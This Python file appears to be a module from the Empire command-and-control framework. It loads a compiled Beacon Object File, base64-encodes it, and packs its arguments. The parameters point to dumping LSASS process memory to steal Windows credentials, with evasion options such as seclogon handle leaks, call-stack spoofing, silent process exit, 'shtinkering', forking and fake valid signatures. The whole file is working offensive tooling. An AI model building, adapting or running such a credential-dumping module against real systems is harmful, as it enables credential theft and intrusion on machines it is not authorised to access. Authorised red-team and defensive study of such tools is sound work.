import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.bof_packer import Packer


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        **kwargs,
    ):
        agent_language = kwargs.get("agent_language", "")

        pid = int(params.get("pid", "0") or "0")
        dump_path = params.get("write", "")
        write_file = 1 if dump_path else 0
        chunk_size = int(params.get("chunksize", "0") or "0")
        use_valid_sig = 1 if params.get("valid") == "true" else 0
        fork = 1 if params.get("fork") == "true" else 0
        snapshot = 1 if params.get("snapshot") == "true" else 0
        dup = 1 if params.get("duplicate") == "true" else 0
        elevate_handle = 1 if params.get("elevate-handle") == "true" else 0
        duplicate_elevate = 1 if params.get("duplicate-elevate") == "true" else 0
        get_pid = 1 if params.get("getpid") == "true" else 0
        use_seclogon_leak_local = (
            1 if params.get("seclogon-leak-local") == "true" else 0
        )
        seclogon_leak_remote_binary = params.get("seclogon-leak-remote", "")
        use_seclogon_leak_remote = 1 if seclogon_leak_remote_binary else 0
        use_seclogon_duplicate = 1 if params.get("seclogon-duplicate") == "true" else 0
        spoof_callstack = 1 if params.get("spoof-callstack") == "true" else 0
        silent_process_exit = params.get("silent-process-exit", "")
        use_silent_process_exit = 1 if silent_process_exit else 0
        use_lsass_shtinkering = 1 if params.get("shtinkering") == "true" else 0

        script_path = main_menu.modulesv2.module_source_path / module.bof.x64
        bof_data = script_path.read_bytes()
        b64_bof_data = base64.b64encode(bof_data).decode("utf-8")

        # Pack arguments matching CNA bof_pack order: iziiiiiiiiiiiziiizi
        packer = Packer()
        packer.addint(pid)  # i - pid
        packer.addstr(dump_path)  # z - dump_path
        packer.addint(write_file)  # i - write_file
        packer.addint(chunk_size)  # i - chunk_size
        packer.addint(use_valid_sig)  # i - use_valid_sig
        packer.addint(fork)  # i - fork
        packer.addint(snapshot)  # i - snapshot
        packer.addint(dup)  # i - dup (duplicate)
        packer.addint(elevate_handle)  # i - elevate_handle
        packer.addint(duplicate_elevate)  # i - duplicate_elevate
        packer.addint(get_pid)  # i - get_pid
        packer.addint(use_seclogon_leak_local)  # i - use_seclogon_leak_local
        packer.addint(use_seclogon_leak_remote)  # i - use_seclogon_leak_remote
        packer.addstr(seclogon_leak_remote_binary)  # z - seclogon_leak_remote_binary
        packer.addint(use_seclogon_duplicate)  # i - use_seclogon_duplicate
        packer.addint(spoof_callstack)  # i - spoof_callstack
        packer.addint(use_silent_process_exit)  # i - use_silent_process_exit
        packer.addstr(silent_process_exit)  # z - silent_process_exit
        packer.addint(use_lsass_shtinkering)  # i - use_lsass_shtinkering

        return main_menu.modulesv2.format_bof_output(
            bof_data_b64=b64_bof_data,
            hex_data=packer.getbuffer_data(),
            agent_language=agent_language,
            obfuscate=obfuscate,
        )
